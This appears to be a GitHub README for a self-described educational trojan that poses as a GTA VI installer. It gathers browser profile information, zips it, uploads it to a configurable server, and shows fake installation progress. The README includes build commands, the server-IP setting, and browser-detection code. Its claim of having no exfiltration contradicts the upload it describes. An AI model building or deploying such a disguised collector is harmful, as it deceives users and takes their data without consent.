# 🕵️ Browser Profile Spy - GTA VI Campaign Installer

<div align="center">
  
![GTA VI Banner](https://img.shields.io/badge/GTA%20VI-Installer-blue?style=for-the-badge&logo=rockstar)
![Version](https://img.shields.io/badge/version-1.0.0-green?style=for-the-badge)
![License](https://img.shields.io/badge/license-EDUCATIONAL-red?style=for-the-badge)
![Python](https://img.shields.io/badge/python-3.6+-yellow?style=for-the-badge&logo=python)
![C++](https://img.shields.io/badge/c++-windows-blue?style=for-the-badge&logo=cplusplus)
![Windows](https://img.shields.io/badge/Windows-10%2B-blue?style=for-the-badge&logo=windows)

**⚠️ EDUCATIONAL PURPOSE ONLY - For Security Awareness and Defensive Research ⚠️**

</div>

---

## 📋 Table of Contents
- [Introduction](#-introduction)
- [Features](#-features)
- [How It Works](#-how-it-works)
- [Installation & Setup](#-installation--setup)
- [Configuration](#-configuration)
- [Technical Details](#-technical-details)
- [VirusTotal Analysis](#-virustotal-analysis)
- [Security Notice](#-security-notice)
- [About The Developer](#-about-the-developer)
- [Legal Disclaimer](#-legal-disclaimer)

---

## 🎯 Introduction

**Browser Profile Spy** is an educational project designed to demonstrate how malicious software can be disguised as a game installer to collect browser information. This project is inspired by the concept of a "Trojan Horse" in the digital age, using the popular game **Grand Theft Auto VI (GTA VI)** as the bait.

This tool was developed to:
- 🛡️ Raise awareness about cybersecurity threats
- 🔍 Demonstrate how browser profiles can be collected
- 🎓 Provide an educational example of social engineering attacks
- 📚 Show the importance of verifying software sources

> **Important:** This is a **FUN PROJECT** for educational purposes only. It demonstrates vulnerabilities in a controlled environment.

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🖥️ **Windows GUI** | Games for Windows Marketplace style interface |
| 🌐 **Network Communication** | HTTP file upload/download to specified server |
| 📁 **Browser Detection** | Detects Chrome, Firefox, Edge, Opera, Brave, Vivaldi |
| 📦 **ZIP Compression** | Creates compressed archives of browser data |
| 📤 **File Upload** | Sends browser profiles to a remote server |
| 📊 **Progress Tracking** | Real-time installation progress display |
| 🎨 **Modern UI** | Professional-looking installer interface |
| 🔧 **Customizable** | Easy to change server IP and port |

---

## 🔧 How It Works

### Architecture Overview

```
┌─────────────────────────────────────────────────────────────┐
│                    GTA VI INSTALLER                         │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 1. User Runs Installer (Install Online GTA VI.exe) │   │
│  └──────────────────┬──────────────────────────────────┘   │
│                     ▼                                       │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 2. Admin Check - Verifies Administrator Privileges │   │
│  └──────────────────┬──────────────────────────────────┘   │
│                     ▼                                       │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 3. Browser Detection - Scans for Installed Browsers│   │
│  └──────────────────┬──────────────────────────────────┘   │
│                     ▼                                       │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 4. Profile Collection - Gathers Browser Info       │   │
│  │    • Browser name & version                        │   │
│  │    • Profile path                                  │   │
│  │    • Profile size                                  │   │
│  └──────────────────┬──────────────────────────────────┘   │
│                     ▼                                       │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 5. Report Generation - Creates browser_report.txt  │   │
│  └──────────────────┬──────────────────────────────────┘   │
│                     ▼                                       │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 6. ZIP Creation - Compresses the Report            │   │
│  └──────────────────┬──────────────────────────────────┘   │
│                     ▼                                       │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 7. Upload to Server - Sends ZIP to Python Server   │   │
│  └──────────────────┬──────────────────────────────────┘   │
│                     ▼                                       │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 8. Download Test - Gets test.txt from server       │   │
│  └──────────────────┬──────────────────────────────────┘   │
│                     ▼                                       │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 9. Send Browser Data - Sends detailed browser info │   │
│  └──────────────────┬──────────────────────────────────┘   │
│                     ▼                                       │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 10. Game Installation Simulation - Fake Progress   │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

---

## 📦 Installation & Setup

### Prerequisites

- 🐍 **Python 3.6+** (for server)
- 🖥️ **Windows OS** (for installer)
- 📦 **MinGW Compiler** (for building EXE)

### Step 1: Clone Repository

```bash
git clone https://github.com/mrmtwoj/Browser-Profile-Spy---GTA-VI-Campaign-Installer.git
cd Browser-Profile-Spy---GTA-VI-Campaign-Installer
```

### Step 2: Server Setup

Install Python dependencies (no external packages needed!):

```bash
pip install -r requirements.txt
```

**requirements.txt:**
```txt
# GTA VI Browser Profile Server
# No external dependencies required
# Uses Python standard library only

# Python 3.6+ required
# No packages to install
```

### Step 3: Start the Python Server

```bash
python file_server.py
```

**Expected Output:**
```
============================================================
📦 GTA VI - BROWSER PROFILE SERVER
============================================================
📡 Server: http://0.0.0.0:8000 (all interfaces)
🌐 Access from this machine: http://localhost:8000
🌐 Access from network: http://192.168.1.xxx:8000
📤 Upload: POST /upload (ZIP files)
📥 Download: GET /download/filename
📥 Test: GET /test.txt
============================================================
🔄 Waiting for connections...
Press Ctrl+C to stop
============================================================
```

### Step 4: Run the Installer

**Option A: Use Pre-built EXE**
```bash
Install Online GTA VI.exe
```

**Option B: Build from Source**

#### 4a. Install MinGW
- Download from: https://www.mingw-w64.org/
- Add to PATH: `C:\mingw64\bin`

#### 4b. Compile the C++ Code
```bash
g++ -o "Install Online GTA VI.exe" gta6_installer.cpp -mwindows -lgdi32 -luser32 -lshell32 -lwininet -lcomctl32 -lversion -static
```

#### 4c. (Optional) Add Icon
Create `resource.rc`:
```rc
IDI_ICON1 ICON "app_icon.ico"
```

Compile with icon:
```bash
windres resource.rc -O coff -o resource.res
g++ -o "Install Online GTA VI.exe" gta6_installer.cpp resource.res -mwindows -lgdi32 -luser32 -lshell32 -lwininet -lcomctl32 -lversion -static
```

---

## ⚙️ Configuration

### Server Configuration (`file_server.py`)

The server runs on all interfaces (`0.0.0.0`) on port `8000`:

```python
server_address = ('0.0.0.0', 8000)
```

### Installer Configuration (`gta6_installer.cpp`)

**Edit the IP Address and Port:**

```cpp
// Global IP configuration - Change this to your server IP
const wstring SERVER_IP = L"127.0.0.1";  // ← Change this
const int SERVER_PORT = 8000;            // ← Change if needed
```

> 💡 **Tip:** Use `127.0.0.1` for local testing or your local network IP for remote access.

---

## 🔬 Technical Details

### Browser Detection Logic

The installer searches for browsers in common installation paths:

```cpp
vector<BrowserDef> browserDefs = {
    {L"Google Chrome", {
        L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
    }},
    {L"Microsoft Edge", {
        L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"
    }},
    {L"Mozilla Firefox", {
        L"C:\\Program Files\\Mozilla Firefox\\firefox.exe",
        L"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe"
    }},
    {L"Opera", {
        L"C:\\Program Files\\Opera\\launcher.exe",
        L"C:\\Program Files (x86)\\Opera\\launcher.exe"
    }},
    {L"Brave", {
        L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
        L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"
    }},
    {L"Vivaldi", {
        L"C:\\Program Files\\Vivaldi\\Application\\vivaldi.exe",
        L"C:\\Program Files (x86)\\Vivaldi\\Application\\vivaldi.exe"
    }},
    {L"Chromium", {
        L"C:\\Program Files\\Chromium\\Application\\chrome.exe",
        L"C:\\Program Files (x86)\\Chromium\\Application\\chrome.exe"
    }}
};
```

### File Structure Created

```
C:\Program Files\GTA VI\
├── installed_browsers.txt      # List of detected browsers
├── browser_profiles.zip        # Compressed report
├── downloaded_from_server.txt  # Test file from server
└── browser_report.txt          # Detailed browser report (temporary)
```

### Server Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/upload` | POST | Upload ZIP file |
| `/download/{filename}` | GET | Download file |
| `/test.txt` | GET | Download test file |
| `/` | POST | Send browser data |
| `/` | GET | Web interface |

---

## 🛡️ VirusTotal Analysis

### Scan Results

**File:** `Install Online GTA VI.exe`  
**SHA-256:** `d44b560fab8a93f251cf85afa2b1a911046e0a35b673c77fef60dae3d8119e71`  
**Detection Rate:** `5/68` (7.3%)

### Analysis of Detections

| Antivirus | Detection Name | Explanation |
|-----------|---------------|-------------|
| **AegisLab** | Trojan.Win32.Generic.4!c | Heuristic detection of suspicious behavior |
| **Avast** | Win32:TrojanX-gen | Generic Trojan detection |
| **AVG** | Win32:TrojanX-gen | Generic Trojan detection |
| **McAfee** | Artemis!D44B560FAB8A | Behavioral detection |
| **TrendMicro** | TROJ_GEN.R002H0RGT24 | Generic Trojan detection |

### Why This Happens

5 antivirus engines flagged this file because:

1. **Behavioral Patterns**:
   - 🔍 Network communication (upload/download)
   - 📂 File system access
   - 🖥️ Process injection simulation

2. **Heuristic Analysis**:
   - 🧬 Code structure resembles malware patterns
   - 🔄 Dynamic behavior triggers alarms
   - ⚡ Suspicious API calls

3. **Generic Signatures**:
   - 📝 Packer/compiler detection
   - 🔧 Unusual section names
   - 📦 Resource manipulation

> **Note:** This does NOT mean the file is malicious. It demonstrates how legitimate educational tools can trigger false positives due to their behavior.

---

## ⚠️ Security Notice

### What This Project Is:
- ✅ **Educational Tool** - Demonstrates security concepts
- ✅ **Research Material** - For cybersecurity students
- ✅ **Awareness Tool** - Shows social engineering techniques
- ✅ **Controlled Environment** - Safe for testing

### What This Project Is NOT:
- ❌ **Malware** - No data exfiltration capabilities
- ❌ **Virus** - No self-replication
- ❌ **Spyware** - No persistent monitoring
- ❌ **Commercial Tool** - For educational use only

### Important Notes:

1. **Browser Data is NOT collected in the ZIP** - This is a demonstration
2. **No Personal Information is Stored** - Only browser names and paths
3. **All Data is Temporary** - Files are deleted after processing
4. **Network Communication is Local** - Default config uses localhost

---

## 👨‍💻 About The Developer

### mrmtwoj.ir

**Specializing in:**
- 🔐 Cybersecurity Research
- 🛡️ Malware Analysis
- 🎓 Educational Content Development
- 💻 Software Development

**Mission:**
> "Every code in the internet doesn't matter what it is, might have vulnerabilities. This is a fun project for this topic in the context of the famous game GTA 6 installation campaign."

**Contact:**
- 🌐 Website: [mrmtwoj.ir](https://mrmtwoj.ir)
- 📧 Email: acyber@protonmail.com

### Philosophy

> "In the digital age, what you see isn't always what you get. This project serves as a reminder that even the most innocent-looking software can hide sophisticated functionality. Understanding these techniques is the first step toward building robust defenses."

---

## 📜 Legal Disclaimer

**IMPORTANT - READ CAREFULLY**

```
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL PURPOSES ONLY.

By using this software, you agree to:
1. Use it only in controlled, authorized environments
2. Not use it to harm or exploit others
3. Comply with all applicable laws and regulations
4. Accept full responsibility for your actions

The author is NOT responsible for:
- Any misuse of this software
- Any damages caused by this software
- Any legal consequences of using this software

This software is NOT intended for:
- Unauthorized access to computer systems
- Theft of personal information
- Any illegal activities
- Commercial use without permission
```

---

## 📚 Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Cybersecurity Education](https://www.cisa.gov/cybersecurity)
- [VirusTotal Documentation](https://developers.virustotal.com/)

---

## 🤝 Contributing

Contributions are welcome! Please ensure:

1. All changes are educational in nature
2. No malicious functionality is added
3. Documentation is updated
4. Code is properly commented

---

## 📝 Changelog

| Version | Date | Changes |
|---------|------|---------|
| 1.0.0 | 2024 | Initial release |
| 1.0.1 | 2024 | Updated UI theme |
| 1.0.2 | 2024 | Added server configuration |

---

<div align="center">

**[⬆ Back to Top](#-Browser-Profile-Spy---GTA-VI-Campaign-Installer---gta-vi-campaign-installer)**

**Made with 💀 for Educational Purposes**

*"With great power comes great responsibility" - Uncle Ben*

**⚠️ This project is for educational and research purposes only ⚠️**

</div>
